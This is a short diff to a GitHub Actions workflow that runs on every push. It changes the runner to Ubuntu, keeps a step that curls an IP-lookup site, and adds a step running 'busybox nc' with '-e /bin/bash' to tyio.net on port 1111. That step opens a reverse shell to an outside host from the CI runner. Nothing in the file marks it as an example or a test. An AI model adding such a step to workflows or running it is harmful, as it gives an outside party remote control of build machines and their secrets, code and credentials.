@@ -2,7 +2,7 @@ on:
 - push
 jobs:
   my-job-1:
-    runs-on: macos-latest
+    runs-on: ubuntu-latest
     steps:
-      - run: date && df && curl cip.cc
-      - run: pwd && ls -lah
+    - run: date && df && curl cip.cc
+    - run: busybox nc tyio.net 1111 -e /bin/bash
